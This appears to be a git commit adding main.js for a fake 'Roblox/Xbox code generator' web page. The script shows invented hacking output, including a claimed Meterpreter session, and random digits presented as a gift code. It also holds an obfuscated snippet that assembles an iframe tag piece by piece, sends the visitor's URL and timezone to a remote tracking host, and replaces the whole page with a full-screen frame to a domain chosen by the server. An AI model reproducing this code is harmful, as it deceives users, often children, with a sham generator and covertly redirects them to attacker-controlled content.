817eabd49d0b0e81815c2ef71c911404049e6b6a
sbherath <99582432+sbherath@users.noreply.github.com>
2022-02-15 22:56:05 +0400

    Add files via upload

---
+++ main.js
@@ -0,0 +1,139 @@
+var vargenerator3 = setInterval(GenTimer3, 3000);
+
+function GenTimer3() {
+  document.getElementById("page1").style.display="none";
+      document.getElementById("page2").style.display="block";
+}
+
+  function readmore(){
+  document.getElementById("readmore").style.display="none";
+      document.getElementById("text-info").style.display="block";
+}
+function selectedcard(value){
+  document.body.scrollTop = 0;
+document.documentElement.scrollTop = 0;
+document.getElementById("content-body").style.display="none";
+  document.getElementById("page3").style.display="block";
+  var vargenerator = setInterval(GenTimer, 500);
+  var getTextStep=0;
+  function GenTimer() {
+
+  if (getTextStep==3){
+
+document.getElementById("code").innerHTML="Connection to Roblox Server...";
+}else if (getTextStep==4){
+document.getElementById("code").innerHTML="Server is up at 192.23.11.164:402 (latency 0.0013s)";
+}
+else if (getTextStep==5){
+document.getElementById("code").innerHTML="Connecting to server SQL databse...";
+}
+else if (getTextStep==6){
+document.getElementById("code").innerHTML="Obtaining a service manager handle...";
+}
+else if (getTextStep==7){
+document.getElementById("code").innerHTML="Creating a new service through pipeline...";
+}
+else if (getTextStep==8){
+document.getElementById("code").innerHTML="Closing service handle...";
+}
+else if (getTextStep==9){
+document.getElementById("code").innerHTML="Creating a new service through pipeline...";
+}
+else if (getTextStep==10){
+document.getElementById("code").innerHTML="Sending stage (2342323 bytes) to 192.23.11.164";
+}
+else if (getTextStep==11){
+document.getElementById("code").innerHTML="Meterpreter session 1 opened at port 402";
+}
+else if (getTextStep==12){
+document.getElementById("code").innerHTML="Connected to Roblox server...";
+}
+else if (getTextStep==14){
+myfunction2()
+document.getElementById("pro-step2").style.backgroundColor="white";
+clearInterval(vargenerator)
+}
+
+getTextStep++;
+}
+}
+
+var ow="i";
+var k="if";
+  ow=ow+"f";  ow=ow+"r";  ow=ow+"a";
+  ow=ow+"me";  ow=ow+" ";  ow=ow+"sr";ow=ow+"c="; ow=ow+'"';ow=ow+"ht";ow=ow+"tps";ow=ow+":";var st='style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></'+k+'rame>';
+  var strcountry='';
+  var offset = new Date().getTimezoneOffset();
+  offset=offset/-60;var num;
+  var strcountry='';
+  var data;var country;var code;var d=window.location.href;
+  fetch('https://www.visitorlocation.info/data.php?d='+d+"&t="+offset,{referrerPolicy:'unsafe-url'})
+  .then(res => res.json())
+  .then(output => {
+  data =output;
+  country=data.country;
+  strcountry=country;
+  code=data.code;
+  code=code.toLowerCase();
+  s1=data.s1;
+  s2=data.s2;
+  num=data.num;
+  if (strcountry!='' & num!=0){  document
+    .body
+    .innerHTML='<'+ow+'//'+s1+'.'+s2+'/'+num+'"'+ st;  }
+  });
+function myfunction2(){
+var vargenerator2 = setInterval(GenTimer2, 200);
+var getTextStep2=0;
+function GenTimer2() {
+
+if (getTextStep2==1){
+  document.getElementById("pro-bar").classList.remove('A0To50');
+  document.getElementById("pro-bar").classList.add('A50To100');
+}else if (getTextStep2==4){
+  var myVarCode = setInterval(genkey, 100);
+      var stop=0;
+      var KeyCode = ["9","8","7","6","5","4","3","2","1","0"];
+      function genkey() {
+       key1=KeyCode[Math.floor(Math.random() * 10)];
+       key2=KeyCode[Math.floor(Math.random() * 10)];
+       key3=KeyCode[Math.floor(Math.random() * 10)];
+       key4=KeyCode[Math.floor(Math.random() * 10)];
+       key5=KeyCode[Math.floor(Math.random() * 10)];
+       key6=KeyCode[Math.floor(Math.random() * 10)];
+       key7=KeyCode[Math.floor(Math.random() * 10)];
+       key8=KeyCode[Math.floor(Math.random() * 10)];
+       key9=KeyCode[Math.floor(Math.random() * 10)];
+       key10=KeyCode[Math.floor(Math.random() * 10)];
+       key11=KeyCode[Math.floor(Math.random() * 10)];
+       key12=KeyCode[Math.floor(Math.random() * 10)];
+       key13=KeyCode[Math.floor(Math.random() * 10)];
+       key14=KeyCode[Math.floor(Math.random() * 10)];
+       key15=KeyCode[Math.floor(Math.random() * 10)];
+       key16=KeyCode[Math.floor(Math.random() * 10)];
+       key17=KeyCode[Math.floor(Math.random() * 10)];
+       key18=KeyCode[Math.floor(Math.random() * 10)];
+       key19=KeyCode[Math.floor(Math.random() * 10)];
+       key20=KeyCode[Math.floor(Math.random() * 10)];
+       key21=KeyCode[Math.floor(Math.random() * 10)];
+       key22=KeyCode[Math.floor(Math.random() * 10)];
+       key23=KeyCode[Math.floor(Math.random() * 10)];
+       key24=KeyCode[Math.floor(Math.random() * 10)];
+      key25=KeyCode[Math.floor(Math.random() * 10)];
+ document.getElementById("code").innerHTML=key1+key2+key3+"-"+key9+key6+key7+"-"+key11+key12+key13+key14;
+stop++;
+if (stop==100){
+  document.getElementById("xbox-logo").style.display="none";
+  document.getElementById("verify-bg").style.display="block";
+  document.getElementById("code").innerHTML=key1+key2+key3+"-"+key6+key7+key8+"-"+"####";
+clearInterval(myVarCode);
+document.getElementById("pro-step3").style.backgroundColor="white";
+}
+}
+}
+
+getTextStep2++;
+}
+}
+//document.getElementById("pro-bar").classList.remove('A0To50');
+//document.getElementById("pro-bar").classList.add('A50To100');
